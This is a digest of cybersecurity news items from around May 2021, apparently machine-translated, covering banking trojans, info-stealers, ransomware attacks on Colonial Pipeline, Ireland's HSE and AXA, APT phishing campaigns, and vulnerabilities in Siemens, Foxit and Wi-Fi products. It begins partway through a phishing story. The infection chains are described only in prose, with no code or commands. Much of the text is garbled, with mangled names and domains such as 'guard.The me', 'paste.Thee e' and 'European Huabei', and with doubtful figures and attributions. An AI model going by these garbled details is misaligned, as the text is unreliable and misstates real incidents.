Once the user enters its credentials in the login window, it will be redirected to the "one-time password (OTP)" page. When the user enters any 6-digit number (one-time password), the system will prompt the user that the one-time password has expired, and redirect the user to enter a new one-time password, cycling the process until the user gives up trying to reset the password.

Although the malicious phishing page in this attack is almost fake, but after careful observation, you can still find some subtle differences: 1) Even if the phishing page uses a secure connection, the domain name in the address bar is not the UnionBank Online bank domain name; 2) the reCAPTCHA in the phishing page is located at the bottom of the page; 3) the phishing page "Register now", "terms and conditions", "Contact Us" and UITF buttons are not clicked.

Ousaban, like most other Latin American bank trojans, uses a coverage window to steal vouchers from financial institutions.

Ousaban was first active in 2018, and unknown sources say that Ousaban was mainly active in European regions, but the ESET research team said it did not observe any Ousaban bank trojans spread outside Brazil.

Ousaban operators send a phishing email containing malicious MSI files to the target group, induce the victim to execute the JS downloader in the malicious file to download and relieve ZIP documents, and load the Ousaban Bank Trojan using the legitimate program in ZIP.

After the Trojan loads successfully, it has the backdoor function to simulate mouse and keyboard operations and record keystrokes.

The Ousaban backdoor features are similar to the typical Latin American Bank Trojan.

The latest variant of Ousaban uses RealThinClient to communicate with the C & C server, a protocol used by the Latin American Bank Trojans for attacks in Brazil, Mexico, Spain, and Peru.

To achieve a long run on the victim host, the bank Trojan creates an LNK file or a simple VBS loader in the boot folder, or changes the run keys for the Windows registry.

Trend Tech researchers have discovered a new variant of Collector Stealer malware Panda Stealer, The malware is spreading through a global spam campaign designed to steal victims' cryptocurrencies and other information.

The United States, Australia, Japan and Germany were the most affected by the attack.

Hackers send target spam disguised as commercial quote requests, lure victims to click on malicious Excel files, and use malicious Excel files to spread the infection through two chains of infection, one of which is.The XLSM attachment contains malicious macros, download the loader and execute the master theft program; another infection chain involves an addition containing the Excel formula.The XLS file, and the formula uses the PowerShell command to access the paste.Thee e, which has access to the second encrypted PowerShell command.

After being successfully installed, Panda Stealer has the ability to get screenshots of the infected computer and steal browser data (Cookie, password, credentials).

In addition, the malware can collect detailed information such as private keys and past transactions from the victim's various digital currency wallets (Dash, Bytecoin, Litecoin and Ethereum).

Panda Stealer has certain similarities to Collector Stealer, compiled executable behavior, stolen Cookie, and credentials are stored in the SQLite3 database, but has different C & C, build tags, and execution folders.

Secret theft software attacks have spent the last 12 months accounting for the most part in corporate terminal attacks, according to foreign researchers.

The Washington District of Columbia Police Department was ransommailing in April by a suspected Russian-backed hacker group Babuk Locker. Several foreign media reported this week that hacker groups failed negotiations with the police station and sensitive data from the police station leaked.

During the attack, where the hackers claimed to have stolen more than 250GB of data from the station and asked the District of Columbia Police Department (MPD) to pay $4 million, the station expressed its willingness to redeem the encrypted data for $100,000, but hacker groups seemed not satisfied with the price and negotiations were deadlocked.

The hacker group later released more than 20 police profiles on its dark net website, supporting downloads and threatening to " release the password of the personal documents if the department did not raise the price and disclose all the data.

Tulsa, the second-largest city in Oklahoma, was recently hit by ransomware, causing the city to shut down all systems and interrupt online services to prevent the further spread of malware.

The attack severely affected the proper functioning of Tulsa, the closure of the city system denied residents without access to the online billing payment system, utility bills and services, and the City Council, Police and 311 Customer Service sites are under emergency maintenance.

Although the hydropower charging service can use the Tulsans to pay and access bills, it has been unable to register new users for payment and access bills.

The Tulsa City Court will be open in the near future, and late fees due May 10-14 will not be assessed, and no nonpayment order will be issued.

The Court and City Hall are currently not available to debit or credit card payment services, but can accept cash, checks and drafts.

The New York Customer Service Center (311) service has also been affected and only supports answering phone calls.

The attack also affected the Tulsa City Animal Care Society.

The Tulsa Police Department believes that the incident did not affect 911 services and emergency response services, and that customer information was not leaked, but many websites may not have normal access or network service delays due to ransomware attacks.

U. S. defense contractor BlueForce was attacked by Conti ransomware.

Blueforce is a leading integrator of security systems, medical alerts, ancillary health technologies, communications integration, and network surveillance, and one of the U. S. defense contractors.

BlueForce, a US defense contractor, was reportedly attacked by Conti ransomware.

Conti ransomware, a member of Maze cartel, was first discovered in mid-2020, and the victims of the effects of recent attacks included a number of London schools and fashion retailer FatFace.

Like other popular ransomware families, it blackmail victims.

Conti operators claim that all files are currently encrypted by Conti ransomware and can cause failure to recover or damage the encrypted data if the victims do not directly contact the Conti operation team or attempt to restore the data using other recovery software.

Conti operators asked BlueForce for a ransom of 17 bitcoin (worth about $1 million), according to chat records with Conti ransomware operators, and threatened to release its data on its leaked site.

The UK Water Authority (Ofwat) has received more than 20,000 malicious emails this year The UK Water Authority (Ofwat) is an body responsible for economically regulating the privatised water and sewage treatment industries in England and Wales.

Ofwat says it has received a total of 21,486 malicious emails, which have been successfully blocked, with 5,149 labeled phishing email and 16,337 spam.

Ofwat also said it received the most amounts of phishing and spam in February and March this year.

Hackers trick victims into downloading malicious attachments or clicking on malicious links by sending a phishing email.

Since the COVID-19 epidemic, the number and complexity of malicious phishing emails that lure employees to hand over confidential data are increasing sharply. The Microstep Intelligence Bureau reminds you that the identification and isolation of suspicious malicious emails can be realized by opening the email security protection mechanism; you can also organize network security related training, to improve the network security awareness of all staff.

DarkSide claims to attack three more companies, Colonial Pipeline, the major nation's fuel pipeline operator, representing 45% of the total U. S. East Coast fuel supply.

It delivers 100 million gallons of refined fuel (gasoline, diesel, and jet fuel) daily between Houston, Texas and New York Harbor, with pipelines across 14 states and directly serves seven airports, including Hatsfield Jackson, the world's highest passenger airport in Atlanta.

According to the company's official announcement, Colonial went offline to slow the impact on May 7 after the DarkSide ransomware attack, which had caused tens of billions of dollars in losses to Western countries.

The temporary closure of pipeline operations affected production processes, causing gasoline futures to rise 0.6% on the New York Mercantile Exchange, while diesel futures rose 1.1%, both surpassing crude oil.

Colonial then said that its team was developing a restart plan and that although the main lines 1,2,3 and 4) remained offline, some smaller lateral lines between terminals and delivery points are now back to use.

Also affected by the attack was the Federal Motor Vehicle Safety Administration (FMCSA).

On May 11, the FBI confirmed DarkSide's alleged involvement in the cyber attack.

So far, the Colonial main is still closed.

On May 12, DarkSIde claimed to attack three more companies: more than 600 GB of sensitive information from a US Illinois technology service dealer, 400GB of data including "customer personal data" and "protocol details" from a Brazilian firm; data from a Scottish construction firm and company names online.

Siemens has recently released more than a dozen announcements, informing customers of dozens of vulnerabilities affecting RUGGEDCOM, SCALANCE, SIMATIC, SINEMA, SINAMICS and other products.

Of the 14 announcements released this week, nine involved 60 vulnerabilities related to third-party components, and the remaining five involved seven flaws in Siemens products.

Suggestions for third-party components involve SAD DNS cache poisoning vulnerabilities in Linux kernels, dozens of vulnerabilities in the UltraVNC and SmartVNC remote Access tools, two vulnerabilities in the Mendix module, six issues affecting industrial PC and other Intel CPU driver devices, and 19 vulnerabilities in the Aruba Instant Access Point.

Siemens product-specific issues concern how SCALANCE devices handle OSPF packages (DoS), how Tecnomatix Plant Simulation products handle SPP files (DoS, code execution, data extraction), and SIMATIC NET CP devices handle ad-hoc TCP packages.

Siemens recommends using customer installation updates for its products, or applying workarounds and mitigation measures to reduce the risk of being utilized.

Cisco Talos has recently reported that the Lemon Duck botnet uses new infrastructure and components.

Security researchers claim that the Lemon Duck botnet has updated relevant tactics, technology, strategies (TTP) and has also added the Cobalt Strike attack framework to its malware toolkit.

After using an external public application to access the victim host, Lemon Duck operators retrieve other components and module information with malicious C2, download the mining module and virus transmission module using the Trojan downloader written by PowerShell script, perform malicious timing operation with the planned task called syspstem, realize continuous operation and permission improvement on the victim host, and establish a new user account with local administrator authority.

Lemon Duck uses Windows Management Instrumentation (WMI) to detect and disable security-related services to avoid security defense mechanisms on devices.

Lemon Duck can also collect and steal information on the trapped host, including system information like file / directory information, computer name, GUID, and MAC addresses.

The collected information is passed back to the malicious C2 through the application layer protocol, and the malicious C2 in this attack activity exploits the forged domain names on the top-level domain name (TLD) for hiding, which increases the cost of security analysis detection.

Lemon Duck has been active since 2018, using self-propagation functionality and a modular framework to mine the virtual currency.

At the end of August 2020, Lemon Duck activity increased significantly, and over time, its geographical targets also shifted, with early attacks concentrated in areas such as Egypt, India, Iran, the Philippines and Vietnam, and in April attacks began to focus in North America, Europe, Southeast Asia, South America and Africa.

Threat groups are using Hancitor to deploy Cuban ransomware Group-IB A recent report noted that the Cuban ransomware family has worked with Hancitor malware operators for spam attacks.

Zscaler observed the Hancitor (C h a n c i t o r) malware distributing the Vawtrak information stealing Trojan in 2016, and Hancitor has since loaded password stealing programs such as Pony, Ficker, Cobalt Strike.

The researchers found that recent Hancitor activity dropped Cobalt Strike,Cobalt Strike on infected computers was a legitimate penetration test toolkit with enhanced permissions and monitoring capabilities, using deployed beacons or clients on damaged devices to remotely create Shell, to execute PowerShell scripts.

Threat organizations send victims malicious spam disguised as themed "DocuSign", induce victims to click on a "signed document" to download malicious Word documents, enable macrodownload in Word documents and then install Hancitor malware, and use Hancitor to deploy Cuban (C u b a) ransomware.

Cuban ransomware was active since at least January 2020, publishing data on victims refusing to pay the ransom on the DLS website, which as of April 28 released sensitive data from nine aviation, financial, educational and manufacturing companies.

Cuban ransomware, while named and used images from Cuban countries of Fidel Castro, Profero reports as suspected to have originated from Russia.

Cuban ransomware partnerships with malware such as Hancitor could speed up attacks.

The Australian Cyber Security Centre (A C S C) has found that the Avaddon ransomware is launching attacks on various Australian departments.

Avaddon ransomware mainly attacks on academic, aviation, energy, finance, health, information technology, pharmaceuticals, entertainment and other industries.

Avaddon ransomware is a ransomware variant first discovered in February 2019 and sold as a ransomware as a service (RaaS) to crime branches.

Hackers use the GetUserDefaultLCID() function to identify the default geographical location of the user device and system language to screen the victim range, deliver malicious Javascript files containing the victim through phishing email, use double extortion (threat to publish victim data; threat to use DDoS attack victim) technology to stress and further pressure the victim to pay the ransom.
So far, the Avaddon ransomware has no decrypts, and free decrypts compiled under the Avaddon encryption routine vulnerability are available only for older infections.

Advanced Threat Intelligence UNC2529 for Global phishing Activities FireEye recently published a UNC2529 report on phishing activities for all sectors of the world using three new malware (DOUBLEDRAG, DOUBLEDROP and DOUBLEBACK) to launch attacks between December 2,2020 and December 11 and December 18,2020.

UNC2529 extensively uses confusion and file-free malware to complicate detection to deliver a well-coded and scalable backdoor.

The first attack activity was utilized with Tigertigerbeads.The mail address associated with the com domain sends phishing emails containing malicious links, inducing the victim to click on these links to download the Phase 1 payload containing the compressed file.

The compressed file contains the highly confounded JavaScript download program DOUBLEDRAG.

DOUBLEDRAG used to download the Dropper "DOUBLEDROP". written in the second-order PowerShell script

DOUBLEDROP performs decrypts relevant information and saves the encrypted payload in the registry of the corrupted system, effectively enabling file-free malware execution.

The DOUBLEDROP starts the backdoor DOUBLEBACK. for phase 3 in memory

The enumeration registry function of the DOUBLEBACK backdoor is implemented through the Windows dynamic library plugin on the PE side.

The second UNC2529 attack activity attacks by hijacking the legitimate domain name, modifying DNS information, using the legitimate domain name to host the Phase II payload.

Currently, UNC2529 has been evaluated as a professional and well-resource financial criminal organization.

Karpersky has recently discovered unknown malace groups using Rootkit malware to control regional networks for attack activities, and researchers describing Rookit's attacks against Asian and African organizations as Operation TunnelSnake.

Windows Rootkit is often active in APT attacks, where threat organizations implant Windows Rootkit into target group computers, deploy programs to acquire higher permissions, intercept and tamper with core I / O operations performed by the underlying operating system, read files, or process incoming and outgoing network packets.

Moriya is a threat of unknown Rootkit, detected in 2018 that uses Moriya to deploy a passive backdoor on public-facing servers to create a hidden command and control channel with deployed malware infections lasting for months.

Threat organizations used Rootkit and numerous other tools for lateral movement in assault activities against Moriya victims in South Asia, with the BOUNCER backdoor being a tool previously used by APT1.

Kaspersky also discovered ProcessKiller malware that has a lot of code overlap with Moriya.

Microsoft's successful driver Rootkit component deployment and execution has become a daunting task in Windows after introducing driver signature verification.

Researchers have recently monitored Lazarus organizations with a North Korean background using VSingle and ValeforBeta malware against Japan.

The internal construction principles of these two malware are the same as the Torisma and LCPDot malware construction principles in Operations Dream Job attack activities against Japan, and follow the same techniques and strategies.

A static analysis of the malware used in the attack activity: 1) the VSingle and ValeforBeta export functions were the same; 2) ValeforBeta and VSingle malware have similar code to Torisma and LCPDot; The 3) buffer overflow function is identical; 4) performs anti-virtual machine and anti-analysis checks using the Bof_with_anti_VM_check and buffer_overflow_and_anti_analysis functions; 5) uses the same command to control channels to establish communication etc.

The Fuxin PDF Reader is a very popular PDF file reader, with 560 million users worldwide.

Cisco Talos recently revealed a high-risk vulnerability in the Fuxin PDF reader, numbered CVE-2021-21822, as a U A F vulnerability in the V 8 J S engine used by the Fuxin PDF reader.

The UAF vulnerability is caused by the way Fuxin reader application and browser extension handle specific annotation types, and the attacker can induce the user to open carefully constructed malicious PDF files and trigger the vulnerability by running arbitrary code with precise memory control, enabling arbitrary code execution.

Once the exploit is successful, an attacker can execute malicious code on a trapped Windows-end computer, do data damage, and cause a program crash.

The vulnerability affects the Fuxin PDF reader 10.1.3.37598 and before, and has been officially fixed in an updated version 10.1.4.37651.

In addition, more than 10 other vulnerabilities including S Q L injection, D L L hijacking, overboundary write vulnerability, denial of service were fixed in version 10.1.4.

Recently, foreign security personnel have found a FragAttacks security vulnerability that affects all Wi-Fi devices (including computers, smartphones and smart devices). The affected Wi-Fi devices date back to 1997, the latest WPA3 protocol specifications and all modern Wi-Fi modern security protocols were affected, and even Wi-Fi's original security protocol WEP.

FragAttacks Security Vulnerabilities are a collection of new Wi-Fi security vulnerabilities, mainly due to frame aggregation and Wi-Fi 802.11 design defects in the device and in frame segmentation functions and programming errors in Wi-Fi products.

The set of vulnerabilities disclosed by the researchers are the FragAttacks Security Vulnerability Set (CVE-2020-24588, CVE-2020-24587, CVE-2020-24586), WIFI implementation vulnerabilities (CVE-2020-26145, CVE-2020-26144, CVE-2020-26140, CVE-2020-26143), and other vulnerabilities (CVE-2020-26139, CVE-2020-26146, CVE-2020-26147, CVE -2020-26142, CVE-2020-26141).

attackers can exploit these vulnerabilities for aggregation attacks, hybrid key attacks, fragment cache attacks, etc.

If you want to successfully exploit the vulnerability to steal user sensitive data and execute malicious code, and even take over the entire device, the attacker must be within the Wi-Fi range of the target device to successfully implement the attack.

FragAttacks officially announced that it has released security updates and that devices without updates can receive updates to slow attacks through the Web site's HTTPS service.

Mexico blocked the national lottery website European Huabei after the ransomware DDoS attack.

Pronosticos Deportivo is a program of the Mexican national lottery website Loteria Nacional, allowing Mexicans to bet on games and sports games.

When Loteria Nacional learned that the Pronosticos program was attacked, Loteria Nacional and Pronosticos were network isolated, and the IP address could not access the site that did not belong to Mexico, showing the connection timeout.

But if you can get access with the IP address in Mexico before switching to the VPN, you can also access those sites again.

The Mexican government has a suspected interest in blocking Loteria Nacional and Pronosticos sites to prevent distributed denial of service (DDoS) attacks by Avaddon ransomware gangs.

Foreign media BleepingComputer has contacted the Mexican government and has not received a reply until the article was published.

Klarna online payment company revealed a data breach, according to the Swedish website Di.According to Se (Translation), a Swedish fintech company offering online payment services, can view details of other Klarna users' personal information, mailing addresses, purchases and payment methods, and tweets that the random account profile is at risk of being modified.

This error caused a random chain and security security crash of the Klarna account, exposing random user data to the wrong user when accessing the Klarna user interface.

After Klarna discovered the problem, it shut down and interrupted service, pop up to users visiting the site. " We are currently working to address system problems caused by technical errors.

We apologize for any such inconvenience as has been caused.

Currently users cannot log in to the app normally and we are working to solve this problem " alarm message.

Klarna issued a written statement on application errors, said Klarna attaches great importance to the data exposure event, the affected system after solving the relevant problems has been online, analysis and understand the affected consumer groups and influence, promised to take appropriate measures to avoid similar things, also qualitative the data leakage event is human cause.

In the statement, Klarna also said that the payment service, Klarna, card, merchant checkout and merchant user interface were completely not affected by the incident, and apologized to users for the inconvenience caused by the data breach.

Calcutta ATM suffered middleman attack, losses may be up to tens of millions of rupees Calcutta police recently said that fraudsters used middleman attacks to intercept two-way encryption and data transmission between ATM ATM and bank servers, manipulate ATM to let A T M throw money, bank customers will not lose cash in these network attacks, but ATMs will run out of cash.

The Calcutta ATM theft was orchestrated by two people, who were captured by surveillance video.

Investigators say fraudsters may breach the information transfer channel between the ATM switch (ATM) and the bank server: 1) prompt the ATM to issue cash automatically by establishing the proxy bank server to allow "unauthorized transactions"; 2) tamper with the LAN of the ATM control panel itself, block and manipulate the bank server to reject unauthorized transaction orders and change instructions to allowed transactions before the transaction returns to the A T M.

Officially, Jadavpur, Cossipore and New Market's three ATM ATM banks have suffered intense and complex cyber attacks. These ATM ATMs have distributed about Rs 4 million rupees in cash, suspected that more A T M machines have been affected, and the loss could reach tens of millions of rupees.

Rostelecom and NKTsKI disclosed mass cyber attacks against Russian government agencies Rostelecom-Solar with NKTsKI (the National Computer Event Coordination Center created by the Russian FSB) jointly published a study on a series of cyber attacks against government agencies of the Russian Federation in May.

Attackers use phishing messages (specifically designed for government agency activities), public applications (vulnerabilities in Web applications), and trust relationships (invading the contractor's infrastructure) as the main attack media to collect information from mail servers, electronic document management servers, file servers and other sources to destroy the IT infrastructure.

An attacker may reside inside the victim host for a long time without leaking his own information.

The report also revealed the technical characteristics of attackers likely to be cybermercenaries pursuing foreign interests and this series of targeted cyber attacks: 1) malware using Russian companies Yandex and Mail.ru Group's cloud storage downloads collected data; 2) disguised as legitimate utilities Yandex Disk and Disk-O;3) understands the management work features of one of Russia's most popular antivirus software and is able to use its legitimate components to collect other information about the attacked network.

Canada Post recently issued a news notice to 44 major commercial customers that its data had been leaked due to a ransomware attack on the supplier, Commport Communications.

Commport Communications is a supplier of electronic data exchange (EDI) solutions used by Post Canada, to manage transport list data for large parcel business customers.

After a detailed investigation of the attack, the transport lists of 44 commercial customers contained information from over 950,000 recipients, from July 2016 to March 2019, recipient names and addresses (97%), email addresses and phone numbers (3%), but there was no evidence that any financial information was leaked.

In December 2020, Lorenz ransomware organizations posted messages on their data leak site that they had compromised Commport Communications, by leaking 35.3 GB of stolen data during the ransomware attack.

While Canada Post said Commport had no trace of data access at the time of the attack, this seems not to be the case according to leaked data.

Canada Post said it has hired external cybersecurity experts to assist the investigation and has informed the Special Privacy Office.

The disclosure of the "flashcard learning" app Bellingcat report that the flashcard learning app used by American soldiers has exposed a lot of sensitive security protocol information about American nuclear weapons and their storage bases.

American soldiers who keep nuclear weapons in Europe use publicly visible flashcard learning applications to record information.

These actions inadvertently leaked base information, exact bunker information for the nuclear "thermal" vault, and complex security details and protocols such as the location of cameras, frequency of patrols around the vault, secret coercion words when guards are threatened, and unique identifiers required for the restriction zone badges, sensors and radar system information.

flashcard learning applications are popular digital learning tools that display questions as well as answers.

With the potential public safety implications, Bellingcat contacted NATO, the U. S. European Command (EUCOM), the U. S. Defense Department (DoD), and the Dutch Department of Defense (MoD) early with 50 flashcard learning links it found containing details about Chegg, Quizlet and Cram.

The Dutch Defense Ministry said the information would not affect Dutch security, and the US Air Force said it would constantly review and evaluate security protocols to protect sensitive information and operations.

As of the publication of the Bellingcat article, the relevant flashcard learning information appears to have been offline.

Claroty researchers have recently identified serious memory protection bypass vulnerabilities (CVE-2020-15782) in Siemens PLC, SIMATIC S7-1200 and S7-1500 by reverse engineering the MC7 / MC7 + bytecode language used to execute PLC commands in microprocessors.

An attacker can abuse this vulnerability on a disabled access-protected PLC to gain read-write access anywhere on the PLC and to remotely execute malicious code.

An unauthenticated remote attacker visits the TCP port 102 via the network to write any arbitrary data and code to a protected memory area or read sensitive data for further attacks.

This vulnerability not only allows an attacker to execute native code on the Siemens S7 controller, but directly injects any data and code through the user sandbox, bypassing detection of the underlying operating system or any diagnostic software.

Siemens released bug alarm information and related patches on the incident on May 28, prepared further updates for not yet updated products, and provided specific mitigation measures that users can use to reduce risk.

So far, Claroty says there is no evidence that the vulnerability has been exploited in the wild.

The Army reminds remote staff of home IoT devices has issued a new policy requiring the military, civilian staff, contractors and approved remote workers to "remove or close all IoT devices in the workplace" to ensure that any government jobs for remote workers are not monitored by smart devices in the home to reduce the disclosure of official information.

US Army Chief Information Officer, Raj G.Dr. Iyer in the memo (Notepad Tool) noted that all remote working environments for approved remote workers must have no policy of IoT devices effective immediately, including Bluetooth speakers, fitness trackers, smart kitchen appliances, TV and game consoles, and more than 70 devices for home security systems.

In addition, the Army has specifically warned staff to beware of personal family assistants from Amazon, Google, Microsoft, Apple, such as Alexa and Siri.

The Army says that when smart IoT devices are turned up, they constantly listen to and collect data by recording audio, transcripts, and even video, and Army military personnel, civilians, and contractors should protect their privacy and work data: 1) remove all IoT devices from the workspace; 2) turn off or remove all personal mobile devices in the workspace, such as smartphones or tablets; 3) disable audio access on personal assistant applications and devices.

Epsilon Red ransomware attacks Sophos researchers discovered a new malware, Epsilon Red (R E D), during an attack on an American hotel.The e x e), the malware is a ransomware written in the Go language.

The attacker is suspected to use unpatched Microsoft Exchange server or Windows vulnerabilities to access the victim network, use WMI, the attacker can access the victim's internal network from the Exchange server, use PowerShell scripts to start malware, kill processes, delete files, and perform RED.The e x e payload, using the Godirwalk open source project to scan the hard drive for directory path compiled list files, encrypt the folder separately using the generated subprocesses, resulting in a large run of process copies of ransomware over a short period of time.

An attacker encrypts the file with an attached ".The suffix file name of the epsilonred" and place the ransom note in the folder.

If the attacker encrypts the wrong folder path, it may cause the program and system to fail.

The ransom notes for Epsilon Red during this attack were similar to the ransom notes organized by REvil, while the syntax in the Epsilon Red notes was more readable than that for REvil.

So far, Sophos says no other similar features associate Epsilon Red malware with REvil ransomware.

Researchers from the Microstep Intelligence Agency have recently monitored Lazarus attacks against the defense industry through a threat hunting system.

The attack involved the attacker, posing as a German military company, delivering bait documents with malicious macro to the target and topics related to the Korean military company Daewoo Shipbuilding.

Malicious macros in the bait documents use multi-stage components to perform malicious behavior, load the execution remote control module, to achieve remote control of the target host.

The attack activity department also used the usual method, using the pre-invaded site as a C2 communication server, which is highly similar from the execution process, but the details change to some extent, indicating that the attacker is continuously developing and optimizing its attack components.

If you want to get the full version containing IOC, you can reply to "la" in the background of WeChat official account.

Nobelium attacks against U. S. government agencies The Microsoft Threat Intelligence Center (MSTIC) recently discovered massive malicious email attacks by NOBELIUM (APT29, Cozy Bear, and The Dukes) threats against groups like government agencies, think tanks, consultants, and NGOs, targeting about 3,000 email accounts in over 1,000 different organizations.

While the U. S. organizations were most affected by the attack, the victim geographic range spans at least 24 countries and a quarter of the targeted victimized organizations involved international development, humanitarian and human rights work.

The NOBELIUM Threat organization is the organization behind the SolarWinds events, the SUNBURST backdoor, TEARDROP malware, GoldMax malware, and other related components.

On May 25,2021, NOBELIUM threatened organizations disguised as USAID accounts, using legitimate mass mail service Constant Contact to distribute malicious mail to various organizations and vertical industries, mail content for USAID alerts inducing users to click on link URL, redirect users to legitimate Constant Contact services, then again redirected to NOBELIUM organization controlled URL to download included Document.dll (NativeZone) hides files, malicious I S O files loading Cobalt Strike shortcuts, and NOBELIUM threatens organizations with persistent access within the victim by deploying these payloads.

The Justice Department recently seized two domain names, theyardservice[., from NOBELIUM Threat attacks against USAID phishing attacks] The com and the worldhomeoutlet[.] com, these domains are used to receive leaked data, and indicate that the organization belongs to the Russian Foreign Intelligence Agency (SVR).

The NOBELIUM threat organization conducts frequent harpoon phishing attacks with increasing frequency and scope, and Microsoft security researchers expect the threat organization may use a set of evolving strategies to conduct additional activities.

APT organizations use Fortinet vulnerabilities to target an alert issued by the FBI (F B I) indicating that APT organizations with unknown national background are scanning FortiOS vulnerabilities (CVE-2018-13379, CVE-2020-12812 and CVE-2019-5591) for suspected attack activities.

The alert indicates that the threat organization may be using vulnerabilities to access networks involving multiple key infrastructure sectors in preparation for subsequent data breaches or data encryption attacks.

It is suspected that an unknown APT threat organization may have created an account with the user name "elie" for malicious network activity, but it did not disclose details about the relevant APT threat organization.

Fortinet said it fixed the three vulnerabilities and released a patch between August 2019 and July 2020.

The FBI believes that these FortiOS vulnerabilities are still being exploited, urging users using FortiOS products to fix them as soon as possible to prevent attacks.

Win10 update causes failed system taskbar Windowslatest recent report revealed that the system taskbar failed.

Microsoft follows the cumulative update preview of the Windows 10 version of "21H1", released again in May for corporate and individual users to test the update patches.

This update enables the News and Interest Taskbar News feed (News and Interests taskbar news feed) for all users of Windows 10 2004 and later.

Many users feedback notification centers and network icons stop working after installing the update, and in some cases when enabling the news and interest taskbar news feed, the system tray icon in the Windows task bar disappears, is pushed to the right, overlaps with each other, or is pushed to the edge of the screen.

Users said in the feedback center that both Surface Book 3 commercial version and Alienware M17 R5 were affected by the update, and uninstall can solve problems like icon disappearance.

Windowslatest also says in the article that you can choose to disable functionality and remove the update itself to resolve taskbar problems in the new version.

The Apple Silicon "M1" chip has a M1RACLES vulnerability Apple M1 chip developers have found serious CPU flaws to create hidden channels that malicious applications can use to transmit information.

This secret communication can be done without using computer memory, socket, file, or any other operating system features, and channels can be connected to processes run by users at different levels of permission.

These features allow malicious programs to exchange data in a way that cannot be detected.

The developers also said that the defect could not be used to infect the Mac, nor could it be used by malware to steal or tamper with the data on the machine.

It can only be abused by two or more malicious applications already installed on the Mac in a manner unrelated to the M1 defect.

The developers called the flaw a M1racles vulnerability, which is numbered CVE-2021-30747.

The researchers also said the vulnerability could have a serious impact on iPhone and that hidden channels could be used to bypass the iPhone sandbox built into the iOS app.

Under normal circumstances, malicious keyboard applications cannot disclose the key record information because to no access to the Internet. The secret channel can bypass this protection by passing the key record information to another malicious application, and then send the key record information through the Internet.

The M1racles vulnerability could have a bigger impact on iPhone relative to chips.

According to the BleepingComputer disclosure, the guard.The me site is vulnerabilities for hacker organizations or unauthorized people to access personally sensitive information such as date of birth, gender, and encryption password.

On May 12th, the guard.The me site detected suspicious activity, causing the site to shut down.

When a user visits the site, it automatically redirects to the maintenance page (shown below) to notify that the site is closed.

guard.The me said late on the night of May 12 that the loophole has been repaired, "he said," the leak and researchers are investigating the data breach."

guard.The me began sending notification messages to students on May 18.

Currently, the guard.The me said it had fixed the vulnerability involved in the incident, but did not disclose the information.

In addition, the guard.The me is also developing new policies, measures (including database segmentation, and two-factor authentication) to improve security.

It is not yet known that the guard.Whether me report the violation to the Office of the Canadian Privacy Commissioner, guard.Also me did not respond to requests for more information from BleepingComputer.

Kaspersky researchers have discovered a new bank Trojan horse called Bizarro. The malware conducts attacks on 70 banks from different countries in Europe and South America.

Bizarro, a new family of bank trojans from Brazil, researchers have found traces in Argentina, Chile, Germany, Spain, Portugal, France and Italy.

The attacker realizes the distribution of the Bizarro Bank Trojan by sending a phishing email containing a malicious link, inducing the victim to click on the malicious link to download the MSI (Microsoft installer) software package.

Bizarro downloads ZIP files from infected Web sites to perform malicious operations and to upload the collected data to C2.

Bizarro's back door is its core component, which contains more than 100 commands, most of which are used to show fake pop-up messages to users, and some that are even disguised as online banking systems.

Attackers often use Class Bizarro malware to steal credentials from electronic payment systems and online banking systems.

In 2020, Kaspersky researchers observed that several bank trojans (Guildma,Javali,Melcoz and Grandoreiro from Brazil, South America) launched attacks worldwide.

These bank trojans collectively call Tetrade,Tetrade to use various innovative and complex technologies for attack activities.

As the new local bank trojan Bizarro spreads worldwide, researchers say the 2021 bank Trojan threat trend will continue.

The Kaspersky researchers recommend reducing damage to the Class Bizarro Bank Trojans by understanding the latest threat intelligence, improving team capabilities, conducting security training to customers, and implementing anti-fraud solutions.

French ransomware invasion French financial consulting firm Acer Finance and AXA AXA were recently attacked by Avaddon ransomware, branches in Thailand, the Philippines, Malaysia and Hong Kong were affected, and French financial consulting firm Acer Finance recently suffered from Avaddon ransomware.

Avaddon ransomware organizations use the same attack methods as other ransomware organizations: destroy the security of their targets, steal data and lock files on the victim's system, requiring the victims to pay the ransom for decrypt keys / tools. If the victim does not pay the ransom, Avaddon ransomware organizations will conduct DDoS attacks on their victims' websites, forcing them to pay the ransom.

Avaddon ransomware organization claimed to steal AXA 3TB sensitive data at its leaked site last Sunday, and a week after AXA refused to pay the ransom, Avaddon ransomware organization began publishing sensitive data on AXA at its site, including customer medical report information (including sexual health diagnostic report), ID ID information (I D, passport), customer bank account information, claim form information, payment record information, and contract information.

After attacking Acer Finance, Avaddon ransomware organization claimed at its leak site a amounts of confidential information, banks, personal communications, contracts, payment forms and other information from the company's customers and employees.

In addition, ransomware organizations have threatened AXA insurer and Acer Finance to communicate with them within 10 days or leak more important documents.

"The data of AXA's Asia Assistance subsidiary Thailand I P A caused data leaks, and it will notify all corporate customers and individuals affected to take measures," A X A told BleepingComputer.

So far, the incident is still under investigation.

Irish health service HSE suffered from $20 million Conti ransomware Ireland's public health service group Health Service Executive (HSE) recently said it was attacked by suspected Russian-backed Conti ransomware, leaving the HSE system shut down to stop the attack and was required to pay a $20 million ransom to redeem encrypted data.

Hacking organizations use phishing to install TrickBot and BazarLoader trojans, make remote access to infected computers, steal credentials and unencrypted data, then deploy ransomware at the right time, and encrypting all devices.

Due to the HSE system shutdown caused by the attack, HSE diagnostic access and medical records will be limited and the medical visit response time will be slow.

The hacker group behind the researchers shared a stolen sample from Conti's chat screenshot with HSE, and Conti claimed that Conti had penetrated HSE's network for two weeks, during which it stole HSE 700 GB unencrypted files, including sensitive data like patient information, employee information, contracts, financial statements and payroll.

The attack was a zero-day attack, but it did not directly affect the COVID-19 vaccination program.

The Irish Prime Minister said he would not compromise with the group behind the Conti ransomware or pay any ransom.

The Irish Ministry of Health's suspected ransomware attack is still under investigation on Wednesday.

The Microstep Intelligence Agency will continuously track up the ransomware.

Eufy is a smart home brand of Anker, and its connected home security camera is a security product that allows users to retrieve the monitor and store the surveillance video at any time.

On May 17, Reddit user posted exposure said his query Eufy camera data, did not find their own monitoring screen, but watch the strange user real-time monitoring screen and save video, can fully access and set strange user home network information, and then log in again to restore access to their camera, other users also reflect the same problem.

The incident had a smaller impact on users in the United States, New Zealand, Australia, Cuba, Mexico, Brazil and Argentina, leaving European users unaffected.

Eufy issued a statement that some users (0.001% of all users: 001%) had access to other camera data and previous video records due to server upgrades. The researchers found the problem at 5:30am to solve it at 6:30am and said they would contact the affected users to solve the problem.

Also said that the Eufy Baby Monitor, Eufy Smart Lock, Eufy Alert System devices, and Eufy PetCare products were unaffected."5G" introduced a number of new connections, functions and services that represent the complete transformation of telecommunications networks.

